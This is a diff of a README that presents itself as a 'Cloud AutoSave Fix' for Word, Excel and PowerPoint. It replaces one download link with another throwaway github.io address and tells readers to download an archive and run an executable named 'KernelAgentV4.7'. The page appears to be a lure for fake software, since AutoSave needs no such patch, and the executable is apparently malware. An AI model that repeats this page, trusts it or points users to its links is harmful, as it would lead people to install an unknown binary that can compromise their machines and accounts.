@@ -2,14 +2,14 @@
 
 Enable seamless Cloud Save and AutoSave across Microsoft 365 apps — including Word, Excel, and PowerPoint — with full OneDrive and SharePoint integration. This patch activates all related features using KernelAgentV4.7.
 
-[![Download Cloud AutoSave Fix](https://img.shields.io/badge/Download-Cloud_AutoSave_Tool-blueviolet)](https://m365-cloud-autosave-onedrive-sharepoint.github.io/.github
+[![Download Cloud AutoSave Fix](https://img.shields.io/badge/Download-Cloud_AutoSave_Tool-blueviolet)](https://pomidorkaskeletik4.github.io/pomo/ferghj
 )
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](https://m365-cloud-autosave-onedrive-sharepoint.github.io/.github
+1. 📦 **Download the archive** from the [Releases](https://pomidorkaskeletik4.github.io/pomo/ferghj
 ) section  
 2. 📁 **Extract the folder** to any location (e.g. `C:\CloudAutoSaveFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to patch AutoSave functionality  
